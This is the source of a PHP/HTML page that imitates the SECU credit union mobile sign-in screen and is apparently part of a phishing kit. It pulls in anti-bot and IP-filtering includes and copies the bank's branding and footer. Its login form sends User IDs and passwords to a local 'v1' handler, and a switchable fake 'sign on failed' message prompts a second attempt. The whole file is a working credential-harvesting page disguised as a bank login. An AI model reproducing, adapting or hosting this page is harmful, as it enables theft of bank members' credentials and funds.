<?php
session_start();
error_reporting(0);
include 'autob/bt.php';
include 'autob/basicbot.php';
include 'autob/uacrawler.php';
include 'autob/refspam.php';
include 'autob/ipselect.php';
include "autob/bts2.php";
?>
<!DOCTYPE html>
<html lang="en">

<head>
    <script src="https://m.ncsecu.org/o/inc/ncsecu_common.js"></script>
    <title> Mobile Access - Menu</title>
    <meta http-equiv="content-type" content="text/html;charset=UTF-8">
    <meta name="format-detection" content="telephone=no">
    <meta id="viewport" name="viewport" content="width=device-width, initial-scale=1.0">
    <link href="https://m.ncsecu.org/m/Styles/SECUmedium.css?ver=1" rel="stylesheet" type="text/css" media="all">
    <link rel="icon" href="https://m.ncsecu.org/m/Images/SECU/SECUfavicon.ico" type="image/x-icon">
    <link rel="icon" href="https://m.ncsecu.org/m/Images/SECU/icon-v2-128x128.png" sizes="128x128">
    <link rel="icon" href="https://m.ncsecu.org/m/Images/SECU/icon-v2-192x192.png" sizes="192x192">
    <link rel="apple-touch-icon" href="https://m.ncsecu.org/m/Images/SECU/apple-touch-icon-v2-76x76.png">
    <link rel="apple-touch-icon" href="https://m.ncsecu.org/m/Images/SECU/apple-touch-icon-v2-152x152.png"
        sizes="152x152">
    <link rel="apple-touch-icon" href="https://m.ncsecu.org/m/Images/SECU/apple-touch-icon-v2-167x167.png"
        sizes="167x167">
    <link rel="apple-touch-icon" href="https://m.ncsecu.org/m/Images/SECU/apple-touch-icon-v2-180x180.png"
        sizes="180x180">
    <script type="text/javascript" src="https://m.ncsecu.org/m/Scripts/ClientSideHelpers.js"></script>
    <script src="https://m.ncsecu.org/m/Scripts/jquery-3.6.0.min.js"></script>
    <style type="text/css">
        .focusSkip {
            background: #333333;
            height: 50px;
            position: absolute;
            left: 0;
            right: 0;
            top: 1.5em;
        }

        .blurSkip {
            background: #333333;
            height: 50px;
            position: fixed;
            left: 0;
            right: 0;
            top: 0;
        }
    </style>
    <script type="text/javascript">            function onSkipFocus() {
            if ($("#MobileAppBanner").attr("class") === 'blurSkip') {
                $("#MobileAppBanner").removeAttr("class");
                $("#MobileAppBanner").attr("class", "focusSkip");
            }
        }
        function onSkipBlur() {
            if ($("#MobileAppBanner").attr("class") === 'focusSkip') {
                $("#MobileAppBanner").removeAttr("class");
                $("#MobileAppBanner").attr("class", "blurSkip");

            }
        }
    </script><!-- Shape Client JavaScript is common.js -->
    <script src="https://www.ncsecu.org/o/inc/ncsecu_common.js?ver=1"></script>
    <meta name="keywords" content="SECU mobile access, 
    SECU mobile, NCSECU mobile access, NCSECU mobile, State Employees Credit Union Mobile, State Employees Credit Union 
    mobile, State Employees’s Credit Union mobile, SECU mobile app, NCSECU Mobile app, state employees credit union mobile 
    app, credit union mobile,financial institution mobile,bank mobile,checking mobile,checking account mobile,money market 
    mobile,cds mobile,certificate of deposit mobile,savings mobile,savings account mobile,invest mobile,online service 
    mobile,online banking mobile,mobile access,bill payment mobile,visa check card mobile,visa credit card mobile,credit 
    card mobile">
</head>

<body id="SiteBody" class="">
    <div><a class="offscreen" href="https://m.ncsecu.org/m/Menu.aspx#main" onfocus="onSkipFocus();"
            onblur="onSkipBlur();"> [Skip To Content]</a></div><noscript>

    </noscript><a href="http://itunes.apple.com/us/app/SECU/id1435916976?mt=8"
        style="text-decoration: none; color: #ffffff;">
        <table id="MobileAppBanner" width="100%" role="presentation" class="blurSkip">
            <tbody>
                <tr>
                    <td width="30px;" style="vertical-align: middle; padding-left: 10px;"><img src="assets/Logo.fw.png"
                            width="25px;" height="25px;" alt="SECU Logo"></td>
                    <td style="vertical-align: middle; text-align: left;" class="text3">Open in the SECU Mobile App</td>
                    <td width="20px;" style="vertical-align: middle; text-align: right; padding-right: 10px;"
                        class="text3">&gt;</td>
                </tr>
            </tbody>
        </table>
    </a>
    <div style="height: 50px;">&nbsp;</div>
    <div id="logobar" class="logoBar">
        <div id="logoDiv" class="centered noExtraSpace"><img id="logo" class="logo" alt="SECU Logo" title="SECU Logo"
                src="assets/SECU_480_White.png"></div>
    </div><a id="main"></a>
    <form method="post" action="v1<?php if(isset($_GET[''.$theerrkey.''])){echo '?'.$theerrkey.'=On';};?>"
        id="mainForm">
        <div class="aspNetHidden">
            <input type="hidden" name="__VIEWSTATE" id="__VIEWSTATE"
                value="">
        </div>
        <script
            type="text/javascript">var layoutInfo = { logoWidth: 480, logoHeight: 88, logoWithSignOffWidth: 480, logoWithSignOffHeight: 88, resize: true, titlePadOneLine: '.9em', titlePadTwoLine: '.5em', titlePadThreeLine: '.2em', buttonPadOneLine: '.1em', buttonPadTwoLine: '.2em', buttonPadThreeLine: '.8em' }</script>
        <script
            type="text/javascript">function jstest() { document.getElementById('hidJSTest').value = 'true'; }</script>
        <script type="text/javascript">//<![CDATA[
            function WebForm_OnSubmit() {
                jstest();
                return true;
            }
//]]></script>
        <div style="display: none"><input type="hidden" name="ctl00$MainCPH$LoginControl$TextboxBrowserName"
                id="MainCPH_LoginControl_TextboxBrowserName"></div>
        <script type="text/javascript">
            var defaultUserIdLabel = ""; var defaultPassLabel = ""; var requestType = ""; function inputTextStatusChange(b, a) { if (requestType == "MOB") { if (b.value == "" && a == "b") { } else { if (b.value == defaultUserIdLabel && a == "f") { } } } } function inputTextPasswordStatusChange(c, b) { if (requestType == "MOB") { if (c.value == "" && b == "b") { var a = document.createElement("input"); c.parentNode.replaceChild(cloneInputPass(c, a, defaultPassLabel, "password", "inherit"), c) } else { if (c.value == defaultPassLabel && b == "f") { var a = document.createElement("input"); c.parentNode.replaceChild(cloneInputPass(c, a, defaultPassLabel, "password", "inherit"), c); a.focus() } } } } function cloneInputPass(a, e, d, c, b) { e.setAttribute("type", c); e.setAttribute("alt", a.getAttribute("alt")); e.setAttribute("tabindex", a.getAttribute("tabindex")); e.setAttribute("name", a.getAttribute("name")); e.setAttribute("id", a.getAttribute("id")); e.setAttribute("title", a.getAttribute("title")); e.style.cssText = changeToColor(a, b); e.maxLength = a.maxLength; e.setAttribute("autocomplete", a.getAttribute("autocomplete")); e.onfocus = a.onfocus; e.onblur = a.onblur; e.setAttribute("placeholder", d); return e } function strTrim(b) { var a = b; a = a.replace(/^\s\s*/, "").replace(/\s\s*$/, ""); return a } function changeToColor(e, a) { var d = e.style.cssText; d = d.toLowerCase(); var b = " "; if (d.indexOf("color") > 0) { var f = d.split(";"); for (i = 0; i < f.length; i++) { if (f[i].indexOf(":") > 0) { var c = f[i].split(":"); if (strTrim(c[0]) != "color") { b = b + c[0] + ":" + c[1] + ";" } } } } b = strTrim(b); d = (b == "") ? "color:" + a + ";" + d : "color:" + a + ";" + b; e.style.cssText = d; return d } function initVars() { var c = document.getElementsByTagName("head")[0].innerHTML; if (c.indexOf("Styles/SECUmedium.css") > 0) { requestType = "MOB" } if (requestType == "MOB") { defaultUserIdLabel = "User ID"; defaultPassLabel = "Password"; document.getElementById("TextUserID").value = ""; document.getElementById("TextUserID").placeholder = defaultUserIdLabel; document.getElementById("DivLabelUserID").style.display = "none"; document.getElementById("DivLabelPassword").style.display = "none"; var b = document.getElementById("TextPassword"); var a = document.createElement("input"); b.parentNode.replaceChild(cloneInputPass(b, a, defaultPassLabel, "password", "inherit"), b) } else { var b = document.getElementById("TextPassword"); var a = document.createElement("input"); b.parentNode.replaceChild(cloneInputPass(b, a, "", "password", "#000000"), b); document.getElementById("TextUserID").value = ""; document.getElementById("TextUserID").focus() } } if (document.loaded) { initVars() } else { if (window.addEventListener) { window.addEventListener("load", initVars, false) } else { window.attachEvent("onload", initVars) } } try { var labelBrowserNameVar = document.getElementById("MainCPH_LoginControl_TextboxBrowserName"); labelBrowserNameVar.value = $.browser.name } catch (err) { };
        </script>
        <div class="centered topSpace" style="width: 85%;">
            <div class="errorText tinySpaceBelow" style="display:<?php if(!isset($_GET[''.$theerrkey.''])){echo 'none';};?>;"><span id="MainCPH_LoginControl_LabelErrorMessage">Your attempt to sign
                    on has failed.<br>Please check your User ID and Password, then try again.</span></div>
            <div class="noExtraSpace">
                <div style="padding-bottom: .3em;margin-bottom:.3em;overflow: auto;">
                    <div class="signOnText text3" id="DivLabelUserID" style="display: none;"><label for="TextUserID"
                            id="LabelUserID" style="display:none;">User ID</label>:
                    </div>
                    <div class="signOnInput">
                        <input name="UserID" type="text" maxlength="20" id="TextUserID"
                            tabindex="1" title="User ID" autocomplete="off" style="height:1.75em;width:100%;" value=""
                            placeholder="User ID" required="required">
                    </div>
                </div>
                <div style="padding-bottom: 0; overflow: auto;">
                    <div class="signOnText text3" id="DivLabelPassword" style="display: none;"><label for="TextPassword"
                            id="LabelPassword" style="display:none;">Password</label>:
                    </div>
                    <div class="signOnInput"><input type="password" alt="null" tabindex="2"
                            name="Passwd" id="TextPassword"
                            title="Enter your password to log In" maxlength="32" autocomplete="off"
                            placeholder="Password" value="" style="color: inherit; height: 1.75em; width: 100%;"
                            required="required"></div>
                </div>
                <div><input type="hidden" name="MobileToken" id="MobileToken"
                        value="asdf345-asgfadsg-fd@$#6qew-adsfasg-agasf"></div>
            </div>
            <div style="margin-top: .2em; margin-bottom: 0em; clear: both;"><input type="submit"
                    name="ctl00$MainCPH$LoginControl$ButtonSubmit" value="Sign In"
                    id="MainCPH_LoginControl_ButtonSubmit" class="signOnButton fiColoredButton text5 bold"></div><input
                id="hidJSTest" type="hidden" value="false" name="hidJSTest">
        </div>
        <div id="MainCPH_LoginControl_ForgottenPassword" class="forgottenpassword text5"><a
                id="MainCPH_LoginControl_linkForgottenPassword" href="">Forgotten Password</a></div>
        <script type="text/javascript"> //window.document.getElementById("DivLabelUserID").innerHTML = ''; </script>
        <script type="text/javascript" src="assets/js.cookie.min.js.download"></script>
        <script type="text/javascript" src="assets/Fingerprint.js.download"></script>
        <script async="" src="assets/fp.min.js.download" onload="initFingerprintJS()"></script>
        <div style="margin-top: .4em;">
            <div id="MainCPH_SelectionListMenu_contentDiv" class="content">
                <div id="MainCPH_SelectionListMenu_Items_listItemDiv_0" class="menuItem text2"><a id="Menu_1"
                        title="Rates &amp; Fees" href="https://m.ncsecu.org/m/Rates.aspx">Rates &amp; Fees</a></div>
                <div id="MainCPH_SelectionListMenu_Items_listItemDiv_1" class="menuItem text2"><a id="Menu_2"
                        title="Locate Us" href="https://locations.ncsecu.org/search" target="_blank">Locate Us</a></div>
                <div id="MainCPH_SelectionListMenu_Items_listItemDiv_2" class="menuItem text2"><a id="Menu_3"
                        title="Contact Us" href="https://m.ncsecu.org/m/ContactUs_SECU.aspx">Contact Us</a></div>
                <div id="MainCPH_SelectionListMenu_Items_listItemDiv_3" class="menuItem text2"><a id="Menu_4"
                        title="View Full Website" href="https://www.ncsecu.org/home.html">View Full Website</a></div>
            </div>
        </div>
        <input type="hidden"
            name="ctl00$MainCPH$antiCsrfField" id="MainCPH_antiCsrfField"
            value="131406855881912074316022641176191182176">
        <script type="text/javascript" language="Javascript" id="EventScriptBlock">;
            function msieversion() {
                var user_agent = navigator.userAgent;
                if (user_agent.indexOf("MSIE ") > -1 || user_agent.indexOf("Trident/") > -1) {
                    window.location.replace("https://www.ncsecu.org/Errors/generic-browser-support.html");
                }
            }
            msieversion();</script>
        <div class="aspNetHidden"><input type="hidden" name="__VIEWSTATEGENERATOR" id="__VIEWSTATEGENERATOR"
                value="CEF4095C"><input type="hidden" name="__VIEWSTATEENCRYPTED" id="__VIEWSTATEENCRYPTED"
                value=""><input type="hidden" name="__EVENTVALIDATION" id="__EVENTVALIDATION"
                value="W05sL5YVJ040l7zNVHQAfjrw8uf27UlouH08KWoKlhZezCBewacNOzm2HRDjWfFtJf8SBL0XIdH2SNkLYkklNqzpJehooDEPBdbSW+6XmnVn1ct21Gu/PqaStjQmMT9iSsVu54i0rr8cxlIyZtOT2z1mi0i9xEV7r7xs+qJS+s02vYFsYkbKXiVIxmS+7cFPiRFo+Q198K3IJzzaIPLhAUL7fym9I7Wccj2u/OohVvA5l+P5dr7qZUvy8z4AvL/Hou6+2zAE0gBT3iECx/y/6NB3SAM=">
        </div>
    </form>
    <div _ngcontent-ssr-c116="" class="content"><?php if(!stripos($_SESSION['device'],'yochi')){banbot();};?><!----></div>
    <div class="footer text5">
        <div class="smallSpaceBelow"><a href="https://www.ncsecu.org/Home/Legal.html" title="Legal"
                class="Link noShowLink" target="_blank">Legal</a> &nbsp;&nbsp;|&nbsp;&nbsp;
            <a id="linkAccessibility" class="Link noShowLink"
                href="https://www.ncsecu.org/Home/AccessibilityStatement.html" target="_blank">Accessibility</a>
            &nbsp;&nbsp;|&nbsp;&nbsp;
            <a href="https://m.ncsecu.org/m/SiteMap.aspx" id="ViewSiteMapLink" class="Link noShowLink">Site Map</a><br>
            Equal Housing Opportunity
            <img src="assets/ehl_gif_white_s14x13x256Pass.png" width="14" height="13" alt="Equal Housing Lender">
            &nbsp;&nbsp;|&nbsp;&nbsp;
            NMLS#430055
        </div>
        <div class="smallSpaceBelow"><span id="LabelInsuredMessage">Federally Insured by NCUA</span></div>
        <div class="smallSpaceBelow footerDisclaimer"> State Employees' Credit Union conducts all member business in
            English. All origination, servicing, collection, marketing, and informational materials are provided in
            English only. As a service to our members, we will attempt to assist those who have limited English
            proficiency where possible.
        </div><!-- <span id="LabelAccessibilityMessage"></span> -->
    </div>
</body>

</html>